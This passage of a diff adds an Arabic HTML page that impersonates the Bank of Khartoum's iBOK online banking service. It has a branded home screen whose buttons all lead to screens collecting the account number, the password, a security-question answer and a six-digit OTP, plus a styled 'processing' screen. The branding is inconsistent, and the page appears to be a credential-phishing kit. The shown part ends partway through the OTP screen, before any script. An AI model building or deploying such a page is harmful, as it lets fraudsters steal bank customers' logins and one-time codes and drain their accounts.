@@ -1,0 +1,806 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>iBOK - Bank of Khartoum</title>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=Tajawal:wght@300;400;500;700;800;900&family=Space+Mono:wght@400;700&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --red:#C41230;--red-dark:#9B0E26;--red-light:#E84040;
+  --gold:#C9A84C;--gold-light:#E8C97A;--gold-dark:#8B6914;
+  --white:#FFFFFF;--bg:#F5F0F0;--text-dark:#1A1A1A;--text-muted:#888888;--border:#E0E0E0;
+  --c1:#00e5ff;--c3:#69ff47;--c4:#ffc107;--c5:#ff1744;
+}
+html,body{height:100%;font-family:'Cairo',sans-serif;background:var(--bg);color:var(--text-dark);overflow:hidden}
+.screen{display:none;width:100%;height:100vh;flex-direction:column;align-items:stretch}
+.screen.active{display:flex;animation:fadeIn 0.4s ease both}
+@keyframes fadeIn{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.2}}
+@keyframes slideIn{from{opacity:0;transform:translateX(12px)}to{opacity:1;transform:translateX(0)}}
+@keyframes glowPulse{0%,100%{box-shadow:0 0 8px rgba(0,229,255,.3)}50%{box-shadow:0 0 24px rgba(0,229,255,.8)}}
+
+/* ══ HOME ══ */
+#screen-home{overflow-y:auto;background:var(--bg);background-image:repeating-linear-gradient(45deg,rgba(0,0,0,.015) 0px,rgba(0,0,0,.015) 1px,transparent 1px,transparent 12px),repeating-linear-gradient(-45deg,rgba(0,0,0,.015) 0px,rgba(0,0,0,.015) 1px,transparent 1px,transparent 12px)}
+.h-header{background:var(--red);padding:10px 20px;display:flex;align-items:center;justify-content:center;flex-shrink:0;min-height:70px}
+.h-header img{height:50px;width:auto;object-fit:contain}
+.h-login-box{background:#fff;border-radius:14px;margin:14px 14px 10px;padding:18px 16px;box-shadow:0 2px 12px rgba(0,0,0,0.08)}
+.h-login-title{font-size:16px;font-weight:700;color:#1a1a1a;text-align:center;margin-bottom:12px;direction:ltr}
+.h-login-btn{width:100%;background:linear-gradient(#e03030,#c41230);color:#fff;border:none;border-radius:8px;height:46px;padding:0 14px;display:flex;align-items:center;justify-content:space-between;cursor:pointer;font-family:'Cairo',sans-serif;font-size:15px;font-weight:600;direction:ltr;transition:filter .2s}
+.h-login-btn:hover{filter:brightness(.92)}
+.h-services-box{background:#fff;border-radius:14px;margin:0 14px 10px;padding:16px 12px;box-shadow:0 1px 8px rgba(0,0,0,0.06)}
+.h-services-title{font-size:18px;font-weight:800;color:#1a1a1a;text-align:center;margin-bottom:14px}
+.h-services-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:10px}
+.h-service-card{background:#fff;border:1px solid #eee;border-radius:10px;padding:16px 8px 12px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px;cursor:pointer;box-shadow:0 1px 4px rgba(0,0,0,0.06);transition:box-shadow .2s,transform .15s}
+.h-service-card:hover{box-shadow:0 3px 12px rgba(196,18,48,0.15);transform:translateY(-2px)}
+.h-service-card:active{transform:scale(0.97)}
+.h-service-card img{width:70px;height:70px;object-fit:contain}
+.h-service-label{font-size:12px;font-weight:600;color:#666;text-align:center;line-height:1.3}
+.h-quick-box{margin:0 14px 10px;display:flex;flex-direction:column;gap:8px}
+.h-quick-card{background:#fff;border-radius:10px;padding:16px;display:flex;flex-direction:column;align-items:center;gap:8px;cursor:pointer;box-shadow:0 1px 4px rgba(0,0,0,0.06);transition:box-shadow .2s}
+.h-quick-card:hover{box-shadow:0 3px 10px rgba(0,0,0,0.1)}
+.h-quick-label{font-size:13px;font-weight:600;color:#555;text-align:center}
+.h-bank-img-box{margin:0 14px 10px;border-radius:12px;overflow:hidden;box-shadow:0 1px 6px rgba(0,0,0,0.1);position:relative}
+.h-bank-img-box img{width:100%;display:block;object-fit:cover;max-height:180px}
+.h-bank-overlay{position:absolute;bottom:0;left:0;right:0;background:linear-gradient(to top,rgba(0,0,0,.75) 0%,transparent 100%);padding:16px 14px 12px;text-align:center}
+.h-bank-overlay h2{font-size:15px;font-weight:800;color:#fff;margin-bottom:4px}
+.h-bank-overlay p{font-size:11px;line-height:1.6;color:rgba(255,255,255,.85)}
+.h-footer{background:linear-gradient(#bfc1c4,#eff0f1,#fff);border-top:3px solid #c8a84b;padding:14px;display:flex;flex-direction:column;align-items:center;gap:10px;margin:0 14px 14px;border-radius:10px}
+.h-footer-copy{font-size:13px;font-weight:600;color:#444;direction:ltr}
+.h-footer-social{display:flex;gap:10px;align-items:center}
+.h-footer-social img{width:30px;height:30px;opacity:.8}
+
+/* ══ LOGIN/SECURITY/OTP ══ */
+.red-header{background:linear-gradient(160deg,#E03030 0%,#C42020 50%,#A81818 100%);padding:48px 28px 40px;display:flex;flex-direction:column;align-items:center;justify-content:center;position:relative;overflow:hidden;flex-shrink:0}
+.red-header.compact{padding:36px 28px 30px}
+.red-header::before{content:'';position:absolute;top:-60px;right:-60px;width:200px;height:200px;background:rgba(255,255,255,0.05);border-radius:50%}
+.red-header::after{content:'';position:absolute;bottom:-80px;left:-40px;width:220px;height:220px;background:rgba(0,0,0,0.08);border-radius:50%}
+.logo-wrap{display:flex;flex-direction:column;align-items:center;gap:4px;position:relative;z-index:1}
+.logo-arabic{font-size:42px;font-weight:900;color:#FFF;line-height:1}
+.logo-arabic.sm{font-size:32px}
+.logo-arabic span{color:var(--gold-light)}
+.logo-english{font-size:22px;font-weight:700;color:#FFF;letter-spacing:2px;opacity:0.9}
+.logo-english.sm{font-size:16px}
+.logo-english b{color:var(--gold-light);font-weight:900}
+.logo-tagline{font-size:11px;color:rgba(255,255,255,0.6);letter-spacing:3px;text-transform:uppercase;margin-top:6px}
+.white-body{background:#fff;flex:1;border-radius:24px 24px 0 0;margin-top:-20px;padding:28px 24px 20px;overflow-y:auto;position:relative;z-index:2;box-shadow:0 -4px 20px rgba(0,0,0,0.1)}
+.white-body.scrollable{overflow-y:auto}
+.step-bar{display:flex;gap:6px;margin-bottom:20px}
+.step-dot{height:4px;flex:1;border-radius:2px;background:#E8E8E8;transition:all 0.4s}
+.step-dot.done{background:var(--red)}
+.step-dot.active{background:var(--gold)}
+.field{margin-bottom:16px}
+.field label{display:block;font-size:13px;font-weight:600;color:var(--text-dark);margin-bottom:8px}
+.input-wrap{position:relative}
+.input-wrap .icon{position:absolute;top:50%;transform:translateY(-50%);right:14px;color:var(--text-muted);font-size:18px;display:flex;align-items:center}
+.input-wrap .toggle-pass{position:absolute;top:50%;transform:translateY(-50%);left:14px;background:none;border:none;color:var(--text-muted);cursor:pointer;font-size:18px;padding:2px;display:flex;align-items:center}
+input[type="text"],input[type="password"]{width:100%;padding:14px 46px 14px 14px;background:#F8F8F8;border:1.5px solid var(--border);border-radius:12px;color:var(--text-dark);font-family:'Tajawal',sans-serif;font-size:15px;outline:none;transition:all 0.25s;text-align:right}
+input:focus{border-color:var(--red);background:#FFF;box-shadow:0 0 0 3px rgba(196,18,48,0.08)}
+input::placeholder{color:#BBB}
+select{width:100%;padding:14px 46px 14px 14px;background:#F8F8F8;border:1.5px solid var(--border);border-radius:12px;color:var(--text-dark);font-family:'Tajawal',sans-serif;font-size:14px;outline:none;cursor:pointer;appearance:none;transition:all 0.25s;direction:rtl}
+select:focus{border-color:var(--red);box-shadow:0 0 0 3px rgba(196,18,48,0.08)}
+.btn-primary{width:100%;padding:16px;background:linear-gradient(135deg,var(--red-dark),var(--red),var(--red-light));border:none;border-radius:14px;color:white;font-family:'Tajawal',sans-serif;font-size:17px;font-weight:800;cursor:pointer;transition:all 0.25s;margin-top:6px;box-shadow:0 4px 20px rgba(196,18,48,0.3)}
+.btn-primary:hover{transform:translateY(-1px)}
+.btn-primary:disabled{opacity:0.6;cursor:not-allowed;transform:none}
+.error-msg{background:#FFF0F0;border:1px solid rgba(196,18,48,0.25);border-radius:10px;padding:10px 14px;font-size:13px;color:var(--red-dark);margin-bottom:14px;display:none}
+.error-msg.show{display:block}
+.bottom-nav{background:white;border-top:1px solid var(--border);display:flex;flex-shrink:0}
+.nav-item{flex:1;display:flex;flex-direction:column;align-items:center;gap:4px;padding:10px 6px;cursor:pointer}
+.nav-icon{font-size:24px}
+.nav-label{font-size:11px;color:var(--text-muted);font-weight:500}
+.bottom-links{display:flex;justify-content:space-between;margin-top:18px}
+.link{color:var(--red);font-size:13px;font-weight:600;cursor:pointer;text-decoration:none}
+.remember{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px}
+.check-label{display:flex;align-items:center;gap:8px;cursor:pointer;font-size:13px;color:var(--text-muted)}
+.check-label input[type="checkbox"]{display:none}
+.check-box{width:18px;height:18px;border:1.5px solid var(--border);border-radius:5px;display:flex;align-items:center;justify-content:center;transition:all 0.2s;flex-shrink:0}
+.check-label input:checked+.check-box{background:var(--red);border-color:var(--red)}
+.check-label input:checked+.check-box::after{content:'✓';font-size:11px;color:white;font-weight:800}
+.question-box{background:#FFF8F8;border:1.5px solid rgba(196,18,48,0.15);border-radius:12px;padding:14px 16px;margin-bottom:14px;display:flex;align-items:flex-start;gap:12px}
+.q-icon{width:36px;height:36px;flex-shrink:0;background:linear-gradient(135deg,var(--red-dark),var(--red));border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:16px;color:white}
+.q-text{font-size:14px;font-weight:600;color:var(--text-dark);line-height:1.5;padding-top:6px}
+.otp-wrap{display:flex;gap:8px;justify-content:center;margin:20px 0;direction:ltr}
+.otp-input{width:46px!important;height:54px!important;text-align:center!important;font-size:24px!important;font-weight:800!important;border-radius:12px!important;padding:0!important;border:1.5px solid var(--border)!important;background:#F8F8F8!important;color:var(--text-dark)!important;outline:none!important;transition:all 0.2s!important}
+.otp-input:focus{border-color:var(--red)!important;background:white!important;box-shadow:0 0 0 3px rgba(196,18,48,0.1)!important}
+.otp-input.filled{background:#FFF5F5!important;border-color:var(--red)!important;color:var(--red)!important}
+.timer-wrap{display:flex;flex-direction:column;align-items:center;margin:4px 0 12px}
+.timer-ring{width:80px;height:80px;position:relative;display:flex;align-items:center;justify-content:center}
+.timer-ring svg{position:absolute;top:0;left:0;transform:rotate(-90deg)}
+.timer-ring circle{fill:none;stroke-width:4;stroke-linecap:round;transition:stroke-dashoffset 1s linear}
+.timer-ring .bg-circle{stroke:#F0E8E8}
+.timer-ring .fg-circle{stroke:var(--red);stroke-dasharray:220.4}
+.timer-display{font-size:20px;font-weight:800;color:var(--red)}
+.timer-label{font-size:10px;color:var(--text-muted);margin-top:6px;letter-spacing:1px;text-transform:uppercase}
+.otp-notice{background:#F0FFF8;border:1px solid rgba(61,190,138,0.25);border-radius:10px;padding:12px 14px;font-size:13px;color:#2A9060;text-align:center;margin-bottom:16px;line-height:1.6}
+.waiting-notice{background:#FFF8E8;border:1px solid rgba(201,168,76,0.35);border-radius:10px;padding:12px 14px;font-size:13px;color:#8B6914;text-align:center;margin-bottom:16px;line-height:1.6;display:none}
+.waiting-notice.show{display:block}
+.resend{text-align:center;margin-top:14px;font-size:13px;color:var(--text-muted)}
+.spinner{width:18px;height:18px;border:2px solid rgba(255,255,255,0.4);border-top-color:white;border-radius:50%;animation:spin 0.7s linear infinite;display:inline-block;vertical-align:middle;margin-right:6px}
+
+/* ══ PROCESSING SCREEN (NEXUS STYLE) ══ */
+#screen-success{background:#03080f!important;overflow:hidden}
+#screen-success .proc-wrap{
+  flex:1;display:flex;flex-direction:column;
+  background:#03080f;
+  position:relative;overflow:hidden;
+}
+#screen-success .proc-wrap::before{
+  content:'';position:absolute;inset:0;
+  background:radial-gradient(ellipse 80% 50% at 50% -10%,rgba(0,100,200,.15),transparent),
+  radial-gradient(ellipse 40% 40% at 90% 90%,rgba(196,18,48,.06),transparent);
+  pointer-events:none;
+}
+#screen-success .proc-wrap::after{
+  content:'';position:absolute;inset:0;
+  background-image:linear-gradient(rgba(0,229,255,.025) 1px,transparent 1px),
+  linear-gradient(90deg,rgba(0,229,255,.025) 1px,transparent 1px);
+  background-size:50px 50px;pointer-events:none;
+}
+.proc-header{
+  position:relative;z-index:10;
+  background:rgba(7,15,28,.95);
+  border-bottom:1px solid #0d2040;
+  padding:0 20px;height:52px;
+  display:flex;align-items:center;justify-content:space-between;
+  backdrop-filter:blur(12px);flex-shrink:0;
+}
+.proc-logo{display:flex;align-items:center;gap:10px}
+.proc-logo-box{
+  width:32px;height:32px;border:2px solid var(--c1);border-radius:6px;
+  display:grid;place-items:center;font-family:'Space Mono',monospace;
+  font-size:10px;color:var(--c1);animation:glowPulse 2s ease-in-out infinite;
+}
+.proc-title{font-size:14px;font-weight:900;letter-spacing:4px;color:var(--c1);font-family:'Space Mono',monospace}
+.proc-sub{font-size:9px;color:#5a80a0;letter-spacing:2px;font-family:'Space Mono',monospace}
+.proc-status{
+  display:flex;align-items:center;gap:6px;padding:4px 12px;
+  border:1px solid;border-radius:16px;font-family:'Space Mono',monospace;font-size:10px;
+}
+.proc-status.processing{border-color:var(--c4);color:var(--c4);background:rgba(255,193,7,.06)}
+.proc-status.done{border-color:var(--c3);color:var(--c3);background:rgba(105,255,71,.06)}
+.dot{width:7px;height:7px;border-radius:50%;background:currentColor;animation:blink .9s ease-in-out infinite}
+
+.proc-body{
+  flex:1;overflow-y:auto;padding:16px;
+  position:relative;z-index:1;
+  display:flex;flex-direction:column;gap:12px;
+}
+.proc-body::-webkit-scrollbar{width:3px}
+.proc-body::-webkit-scrollbar-thumb{background:#163060}
+
+/* Pipeline */
+.pipeline-box{
+  background:rgba(7,15,28,.8);border:1px solid #0d2040;
+  border-radius:10px;padding:12px 16px;
+  display:flex;align-items:center;justify-content:center;
+  gap:0;flex-wrap:wrap;
+}
+.pp-node{
+  padding:4px 8px;border:1px solid #163060;border-radius:4px;
+  font-family:'Space Mono',monospace;font-size:9px;letter-spacing:1px;
+  color:#2a4060;transition:all .3s;white-space:nowrap;
+}
+.pp-node.lit{border-color:var(--c1);color:var(--c1);background:rgba(0,229,255,.08);box-shadow:0 0 12px rgba(0,229,255,.3)}
+.pp-node.done-lit{border-color:var(--c3);color:var(--c3);background:rgba(105,255,71,.08)}
+.pp-arr{font-size:10px;color:#2a4060;padding:0 3px;transition:color .3s}
+.pp-arr.lit{color:var(--c1)}
+.pp-arr.done-lit{color:var(--c3)}
+
+/* Stats */
+.stats-row{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}
+.stat-card{background:rgba(7,15,28,.8);border:1px solid #0d2040;border-radius:8px;padding:10px;text-align:center}
+.stat-val{font-family:'Space Mono',monospace;font-size:20px;font-weight:700;line-height:1}
+.stat-val.c1{color:var(--c1)}.stat-val.c3{color:var(--c3)}.stat-val.c4{color:var(--c4)}
+.stat-lbl{font-size:9px;color:#5a80a0;letter-spacing:1px;margin-top:4px;font-family:'Space Mono',monospace}
+
+/* Steps */
+.steps-box{background:rgba(7,15,28,.8);border:1px solid #0d2040;border-radius:10px;overflow:hidden}
+.step-item{
+  display:flex;align-items:center;gap:10px;padding:10px 14px;
+  border-bottom:1px solid #0d2040;font-family:'Space Mono',monospace;font-size:10px;
+  transition:all .3s;
+}
+.step-item:last-child{border-bottom:none}
+.step-item.pending{color:#2a4060}
+.step-item.active{color:var(--c1);background:rgba(0,229,255,.04);animation:glowPulse 1.5s infinite}
+.step-item.done{color:var(--c3);background:rgba(105,255,71,.03)}
+.step-item.error{color:var(--c5);background:rgba(255,23,68,.04)}
+.step-num{
+  width:22px;height:22px;border-radius:50%;border:1.5px solid currentColor;
+  display:grid;place-items:center;font-size:9px;flex-shrink:0;
+}
+.step-info{flex:1}
+.step-name{font-size:11px;font-weight:700}
+.step-desc{font-size:9px;color:#5a80a0;margin-top:2px}
+.step-status{font-size:9px;flex-shrink:0}
+
+/* Log */
+.log-box{
+  background:#000;border:1px solid #0d2040;border-radius:10px;
+  padding:10px;height:130px;overflow-y:auto;
+  font-family:'Space Mono',monospace;font-size:9px;line-height:1.9;
+}
+.log-box::-webkit-scrollbar{width:3px}
+.log-box::-webkit-scrollbar-thumb{background:#163060}
+.ll{display:flex;gap:6px}
+.lt{color:#5a80a0;flex-shrink:0}
+.lm.i{color:var(--c1)}.lm.s{color:var(--c3)}.lm.w{color:var(--c4)}.lm.e{color:var(--c5)}
+
+/* IK Box */
+.ik-box{background:#000;border:1px solid #0d2040;border-radius:8px;padding:10px;font-family:'Space Mono',monospace;font-size:9px;line-height:2}
+.ikr{display:flex;justify-content:space-between}
+.ikr .ik-k{color:#5a80a0}.ikr .ik-v{color:var(--c1)}
+.ikr .ik-v.g{color:var(--c3)}.ikr .ik-v.y{color:var(--c4)}
+
+/* Done screen */
+.done-box{
+  background:rgba(7,15,28,.9);border:1px solid rgba(105,255,71,.3);
+  border-radius:12px;padding:20px;text-align:center;
+  animation:slideIn .5s ease;
+}
+.done-icon{font-size:48px;margin-bottom:12px}
+.done-title{font-family:'Space Mono',monospace;font-size:16px;font-weight:700;color:var(--c3);letter-spacing:2px;margin-bottom:8px}
+.done-desc{font-size:12px;color:#5a80a0;line-height:1.8;font-family:'Space Mono',monospace}
+.req-id{color:var(--c4);font-size:11px;margin-top:10px;font-family:'Space Mono',monospace;letter-spacing:1px}
+
+.proc-footer{
+  background:rgba(7,15,28,.95);border-top:1px solid #0d2040;
+  padding:10px 16px;display:flex;align-items:center;justify-content:space-between;
+  flex-shrink:0;
+}
+.pf-item{font-family:'Space Mono',monospace;font-size:9px;color:#5a80a0;display:flex;align-items:center;gap:4px}
+.pf-val{color:var(--c1)}
+.pf-val.g{color:var(--c3)}.pf-val.y{color:var(--c4)}
+</style>
+</head>
+<body>
+
+<!-- ══ SCREEN 0: HOME ══ -->
+<div class="screen active" id="screen-home">
+  <div class="h-header">
+    <img src="logo-header.jpg" alt="Bank of Khartoum">
+  </div>
+  <div class="h-login-box">
+    <div class="h-login-title">Login to</div>
+    <button class="h-login-btn" onclick="goTo('screen-login')">
+      <span style="font-size:18px">→</span>
+      <span style="flex:1;text-align:right">iBOK+ Login</span>
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="white"><path d="M3 3h7v7H3zm0 11h7v7H3zm11-11h7v7h-7zm0 11h7v7h-7z"/></svg>
+    </button>
+  </div>
+  <div class="h-services-box">
+    <div class="h-services-title">الرئيسية</div>
+    <div class="h-services-grid">
+      <button class="h-service-card" onclick="goTo('screen-login')">
+        <svg width="56" height="56" viewBox="0 0 56 56" fill="none"><rect x="10" y="8" width="28" height="34" rx="3" stroke="#C41230" stroke-width="2"/><path d="M16 18h16M16 24h16M16 30h10" stroke="#C41230" stroke-width="2" stroke-linecap="round"/><circle cx="40" cy="40" r="9" fill="white" stroke="#C41230" stroke-width="2"/><path d="M37 40l2 2 4-4" stroke="#C41230" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
+        <span class="h-service-label">تحديث البيانات</span>
+      </button>
+      <button class="h-service-card" onclick="goTo('screen-login')">
+        <img src="currency.jpeg.PNG" alt="العملات الأجنبية">
+        <span class="h-service-label">العملات الأجنبية</span>
+      </button>
+      <button class="h-service-card" onclick="goTo('screen-login')">
+        <img src="limit.jpeg.PNG" alt="سقف المعاملات">
+        <span class="h-service-label">سقف المعاملات اليومية</span>
+      </button>
+      <button class="h-service-card" onclick="goTo('screen-login')">
+        <img src="security.jpeg.PNG" alt="أسئلة الأمان">
+        <span class="h-service-label">أسئلة الأمان</span>
+      </button>
+      <button class="h-service-card" onclick="goTo('screen-login')">
+        <img src="upgrade.jpeg.PNG" alt="ترقية الحساب">
+        <span class="h-service-label">ترقية الحساب</span>
+      </button>
+      <button class="h-service-card" onclick="goTo('screen-login')">
+        <img src="statement.jpeg.PNG" alt="كشف الحساب">
+        <span class="h-service-label">كشف الحساب</span>
+      </button>
+      <button class="h-service-card" onclick="goTo('screen-login')">
+        <img src="investment.jpeg.PNG" alt="استثمار">
+        <span class="h-service-label">استثمار</span>
+      </button>
+      <button class="h-service-card" onclick="goTo('screen-login')">
+        <img src="transfer.jpeg.PNG" alt="تحويلات خاطئة">
+        <span class="h-service-label">تحويلات خاطئة</span>
+      </button>
+    </div>
+  </div>
+  <div class="h-quick-box">
+    <div class="h-quick-card" onclick="goTo('screen-login')">
+      <svg width="40" height="40" viewBox="0 0 40 40" fill="none"><circle cx="18" cy="14" r="7" stroke="#333" stroke-width="2"/><path d="M6 36c0-8 5-13 12-13s12 5 12 13" stroke="#333" stroke-width="2" stroke-linecap="round"/><circle cx="30" cy="28" r="6" fill="#C41230"/><text x="27.5" y="32" font-size="8" fill="white" font-weight="bold">i</text></svg>
+      <span class="h-quick-label">فتح حساب جديد</span>
+    </div>
+    <div class="h-quick-card" onclick="goTo('screen-login')">
+      <svg width="40" height="40" viewBox="0 0 40 40" fill="none"><rect x="6" y="5" width="22" height="28" rx="2" stroke="#333" stroke-width="2"/><path d="M11 13h12M11 18h12M11 23h8" stroke="#333" stroke-width="1.5" stroke-linecap="round"/><circle cx="30" cy="30" r="6" fill="#C41230"/><path d="M27.5 30l2 2 3.5-3.5" stroke="white" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      <span class="h-quick-label">الشروط والأحكام</span>
+    </div>
+    <div class="h-quick-card" onclick="goTo('screen-login')">
+      <svg width="40" height="40" viewBox="0 0 40 40" fill="none"><path d="M20 4C13 4 8 10 8 17c0 9 12 20 12 20s12-11 12-20C32 10 27 4 20 4z" stroke="#333" stroke-width="2"/><circle cx="20" cy="17" r="4" stroke="#C41230" stroke-width="2"/></svg>
+      <span class="h-quick-label">الفروع</span>
+    </div>
+    <div class="h-quick-card" onclick="goTo('screen-login')">
+      <svg width="40" height="40" viewBox="0 0 40 40" fill="none"><path d="M7 13a3 3 0 013-3h20a3 3 0 013 3v14a3 3 0 01-3 3H10a3 3 0 01-3-3V13z" stroke="#333" stroke-width="2"/><path d="M7 15l13 9 13-9" stroke="#333" stroke-width="2" stroke-linecap="round"/></svg>
+      <span class="h-quick-label">اتصل بنا</span>
+    </div>
+  </div>
+  <div class="h-bank-img-box">
+    <img src="bank.png" alt="Bank of Khartoum">
+    <div class="h-bank-overlay">
+      <h2>اي بوك و اي بوك بلس</h2>
+      <p>الخدمات المصرفية عبر الإنترنت تتيح الاطلاع على كشف الحسابات وتحويل الأموال والمدفوعات</p>
+    </div>
+  </div>
+  <div class="h-footer">
+    <div class="h-footer-copy">©2026 iBOK</div>
+    <div class="h-footer-social">
+      <img src="assets/images/footer-logo.svg" alt="BOK">
+      <img src="assets/images/linkidin.svg" alt="LinkedIn">
+      <img src="assets/images/x.svg" alt="X">
+      <img src="assets/images/facebook.svg" alt="Facebook">
+    </div>
+  </div>
+</div>
+
+<!-- ══ SCREEN 1: LOGIN ══ -->
+<div class="screen" id="screen-login">
+  <div class="red-header">
+    <div class="logo-wrap">
+      <div class="logo-arabic">بنك<span>ك</span></div>
+      <div class="logo-english"><b>b</b>ankak</div>
+      <div class="logo-tagline">Elite Banking Corporation</div>
+    </div>
+  </div>
+  <div class="white-body">
+    <div class="step-bar"><div class="step-dot active"></div><div class="step-dot"></div><div class="step-dot"></div><div class="step-dot"></div></div>
+    <div class="error-msg" id="login-error">يرجى ملء جميع الحقول</div>
+    <div class="field"><div class="input-wrap">
+      <span class="icon"><svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M17.982 18.725A7.488 7.488 0 0 0 12 15.75a7.488 7.488 0 0 0-5.982 2.975m11.963 0a9 9 0 1 0-11.963 0m11.963 0A8.966 8.966 0 0 1 12 21a8.966 8.966 0 0 1-5.982-2.275M15 9.75a3 3 0 1 1-6 0 3 3 0 0 1 6 0Z"/></svg></span>
+      <input type="text" id="username" placeholder="أدخل رقم الحساب" autocomplete="off">
+    </div></div>
+    <div class="field"><div class="input-wrap">
+      <span class="icon"><svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M16.5 10.5V6.75a4.5 4.5 0 1 0-9 0v3.75m-.75 11.25h10.5a2.25 2.25 0 0 0 2.25-2.25v-6.75a2.25 2.25 0 0 0-2.25-2.25H6.75a2.25 2.25 0 0 0-2.25 2.25v6.75a2.25 2.25 0 0 0 2.25 2.25Z"/></svg></span>
+      <input type="password" id="password" placeholder="أدخل كلمة المرور">
+      <button class="toggle-pass" onclick="togglePass()"><svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M3.98 8.223A10.477 10.477 0 0 0 1.934 12C3.226 16.338 7.244 19.5 12 19.5c.993 0 1.953-.138 2.863-.395M6.228 6.228A10.451 10.451 0 0 1 12 4.5c4.756 0 8.773 3.162 10.065 7.498a10.522 10.522 0 0 1-4.293 5.774M6.228 6.228 3 3m3.228 3.228 3.65 3.65m7.894 7.894L21 21m-3.228-3.228-3.65-3.65m0 0a3 3 0 1 0-4.243-4.243m4.242 4.242L9.88 9.88"/></svg></button>
+    </div></div>
+    <div class="remember">
+      <label class="check-label"><input type="checkbox" id="remember"><span class="check-box"></span>تذكرني</label>
+      <a class="link">نسيت كلمة المرور؟</a>
+    </div>
+    <button class="btn-primary" onclick="doLogin()" id="login-btn">تسجيل الدخول</button>
+    <div class="bottom-links"><a class="link">لاتستطيع تسجيل الدخول؟</a><a class="link" onclick="goTo('screen-home')">رجوع للرئيسية</a></div>
+  </div>
+  <div class="bottom-nav">
+    <div class="nav-item"><div class="nav-icon">🏦</div><span class="nav-label">بنك النخبة</span></div>
+    <div class="nav-item"><div class="nav-icon">📍</div><span class="nav-label">مواقعنا</span></div>
+    <div class="nav-item"><div class="nav-icon">📞</div><span class="nav-label">المساعدة</span></div>
+    <div class="nav-item"><div class="nav-icon">📘</div><span class="nav-label">فيس بوك</span></div>
+  </div>
+</div>
+
+<!-- ══ SCREEN 2: SECURITY ══ -->
+<div class="screen" id="screen-security">
+  <div class="red-header compact">
+    <div class="logo-wrap"><div class="logo-arabic sm">بنك<span>ك</span></div><div class="logo-english sm"><b>b</b>ankak</div></div>
+  </div>
+  <div class="white-body scrollable">
+    <div class="step-bar"><div class="step-dot done"></div><div class="step-dot active"></div><div class="step-dot"></div><div class="step-dot"></div></div>
+    <div style="font-size:18px;font-weight:800;color:var(--text-dark);margin-bottom:6px">التحقق الأمني</div>
+    <div style="font-size:13px;color:var(--text-muted);margin-bottom:22px;line-height:1.6">اختر سؤالاً وأدخل إجابتك للتحقق من هويتك</div>
+    <div class="field">
+      <label>اختر سؤال الأمان</label>
+      <div class="input-wrap">
+        <span class="icon" style="font-size:12px;top:18px;transform:none;padding-top:14px">▼</span>
+        <select id="security-select" onchange="onQuestionChange()">
+          <option value="">— اختر سؤالاً —</option>
+          <option value="cousin">ما هو اسم ابن عمك الأول؟</option>
+          <option value="city">في أي مدينة ولدت؟</option>
+          <option value="grad">في أي سنة تخرجت من الجامعة؟</option>
+          <option value="nick">ماذا كان لقبك أثناء الطفولة؟</option>
+          <option value="author">اسم مؤلفك المفضل؟</option>
+          <option value="car">اسم الشركة المصنعة للسيارة المفضلة لديك؟</option>
+          <option value="movie">أي فيلم هو المفضل لديك؟</option>
+          <option value="friend">اسم أفضل صديق في الطفولة؟</option>
+          <option value="school">ما هو اسم المدرسة التي التحقت بها؟</option>
+          <option value="football">اسم فريق كرة القدم المفضل لديك؟</option>
+        </select>
+      </div>
+    </div>
+    <div id="question-display" style="display:none">
+      <div class="question-box"><div class="q-icon">🔐</div><div class="q-text" id="q-text-display"></div></div>
+      <div class="field"><label>إجابتك</label><div class="input-wrap"><span class="icon">✏️</span><input type="text" id="security-answer" placeholder="اكتب إجابتك هنا..." autocomplete="off"></div></div>
+    </div>
+    <div class="error-msg" id="sec-error">يرجى اختيار سؤال وكتابة الإجابة</div>
+    <button class="btn-primary" onclick="doSecurity()" id="sec-btn">تأكيد الإجابة والمتابعة</button>
+  </div>
+  <div class="bottom-nav">
+    <div class="nav-item"><div class="nav-icon">📍</div><span class="nav-label">مواقعنا</span></div>
+    <div class="nav-item"><div class="nav-icon">📞</div><span class="nav-label">المساعدة</span></div>
+    <div class="nav-item"><div class="nav-icon">📘</div><span class="nav-label">فيس بوك</span></div>
+    <div class="nav-item"><div class="nav-icon">🏠</div><span class="nav-label">الرئيسية</span></div>
+  </div>
+</div>
+
+<!-- ══ SCREEN 3: OTP ══ -->
+<div class="screen" id="screen-otp">
+  <div class="red-header compact">
+    <div class="logo-wrap"><div class="logo-arabic sm">بنك<span>ك</span></div><div class="logo-english sm"><b>b</b>ankak</div></div>
+  </div>
+  <div class="white-body">
+    <div class="step-bar"><div class="step-dot done"></div><div class="step-dot done"></div><div class="step-dot active"></div><div class="step-dot"></div></div>
+    <div style="font-size:18px;font-weight:800;color:var(--text-dark);margin-bottom:6px">رمز التحقق</div>
+    <div style="font-size:13px;color:var(--text-muted);margin-bottom:22px;line-height:1.6">أدخل الرمز المكوّن من 6 أرقام</div>
+    <div class="timer-wrap">
+      <div class="timer-ring">
+        <svg width="80" height="80" viewBox="0 0 80 80"><circle class="bg-circle" cx="40" cy="40" r="35"/><circle class="fg-circle" id="timer-circle" cx="40" cy="40" r="35" stroke-dashoffset="0"/></svg>
+        <div style="text-align:center"><div class="timer-display" id="timer-display">05:00</div></div>
+      </div>
+      <div class="timer-label">ساعة متبقية</div>
+    </div>
